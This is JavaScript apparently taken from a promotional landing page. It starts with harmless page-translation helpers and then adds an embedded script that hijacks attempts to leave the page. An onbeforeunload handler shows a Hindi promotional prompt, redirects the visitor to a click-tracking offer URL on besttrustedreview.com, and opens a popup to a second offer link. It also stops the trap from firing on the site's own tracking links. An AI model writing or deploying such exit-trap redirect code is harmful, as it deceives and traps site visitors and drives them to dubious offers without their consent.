    function replace_text(lang, text) {
      x = document.getElementById(text);
      if (x) {
        x.innerHTML = translation[lang][text];
      } else {
        console.log("element not Found: " + text);
      }
    }

    function alert_string(lang, text) {
      return translation[lang][text] + "\n\n";
    }

    function translation_available(lang) {
      if (translation[lang]) {
        return lang;
      } else {
        console.log("translation not Found: " + lang);
        return "source";
      }
    }

    function detect_language() {
      var detected_language = navigator.language;
      if (detected_language.length > 2) {
        detected_language = detected_language[0] + detected_language[1];
      };

      if (jQuery.inArray(detected_language, ['ar', 'he', 'fa']) >= 0) {
        $('html').attr('DIR', 'RTL');
      }
      return translation_available(detected_language);
    }

    function translate() {
      var detected_language = detect_language();
      for (y in translation["source"]) {
        replace_text(detected_language, y);
        if (y == 'aler') {
          strAlert += translation[detected_language][y];
        }
      }
      alert(strAlert);

    }

    function getURLParameter(name) {
      return decodeURI(
        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
      );
    }

<script type="text/javascript">
	var nc = 'https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2';
	
	document.getElementById("finlink-id").href = nc;

    (function (w, d) {
        var epp = function () {
            if (w.onbeforeunload === null) {
                var to;
                function repp() {
                    w.onbeforeunload = null;
					window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
                };
                function epp() {
                    to = setTimeout(function () {
                        w.location.replace(nc);
                        repp();
                    }, 100);
                    return 'आधुनिक भारत की तेजी से बढ़ जरूरतों को पूरा करने के लिए कस्टम डिजाइन चरण का अनुभव करने के लिए हमें शामिल हों';
                }
                w.onbeforeunload = epp;
                // Prevent epp firing from clicking on tracking links
                var ln = d.querySelectorAll("[href='"+nc+"']");
                for (i = 0; i < ln.length; ++i) {
                    ln[i].addEventListener("click", function () {
                        repp();
                    });
                }
            }
            ;
        };
        if (d.readyState != 'loading') {
            epp();
        } else {
            d.addEventListener('DOMContentLoaded', epp);
        }
    })(window, document);
</script>
